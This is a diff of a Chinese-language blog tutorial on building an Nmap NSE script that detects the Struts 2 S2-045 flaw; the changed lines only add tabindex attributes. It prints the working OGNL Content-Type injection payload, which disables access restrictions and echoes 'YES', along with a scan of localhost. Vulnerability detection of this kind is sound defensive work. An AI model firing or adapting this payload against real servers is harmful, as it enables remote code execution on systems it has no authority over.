@@ -91,7 +91,7 @@
 <p>思路： 它主要是给服务器端发送一个http请求，这个请求里的<code>Content-type</code>中就是我们的利用代码了。在这里可以称之为<code>Payload</code>。</p>
 <p>相关链接：<a href="https://zhuanlan.zhihu.com/p/25639832">Struts 2 S2-045 Jakarta插件远程代码执行漏洞加固方法</a></p>
 <p>我们先把<code>Payload</code>拿出来：</p>
-<pre><code>%{(#nikenb='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#context.setMemberAccess(#dm)))).(#o=@org.apache.struts2.ServletActionContext@getResponse().getWriter()).(#o.println('YES')).(#o.close())}
+<pre tabindex="0"><code>%{(#nikenb='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#context.setMemberAccess(#dm)))).(#o=@org.apache.struts2.ServletActionContext@getResponse().getWriter()).(#o.println('YES')).(#o.close())}
 </code></pre><p>可以看到有一个YES，当服务器端相应YES的时候，我们就判定这个服务器存在此漏洞。</p>
 <p>根据官方的文档，我们先载入指定的扩展库：</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-lua" data-lang="lua"><span style="color:#75715e">--</span>
@@ -328,7 +328,7 @@ action <span style="color:#f92672">=</span> <span style="color:#66d9ef">function
 <p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2017-06-03/0x03.png" alt="0x03"></p>
 <p>关闭调试模式的扫描结果：
 <img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2017-06-03/0x04.png" alt="0x04"></p>
-<pre><code>liyingzhe : /usr/share/nmap $nmap --script /home/liyingzhe/PycharmProjects/untitled/struts.nse 127.0.0.1
+<pre tabindex="0"><code>liyingzhe : /usr/share/nmap $nmap --script /home/liyingzhe/PycharmProjects/untitled/struts.nse 127.0.0.1
 
 Starting Nmap 7.01 ( https://nmap.org ) at 2017-06-03 03:09 CST
 Nmap scan report for localhost (127.0.0.1)
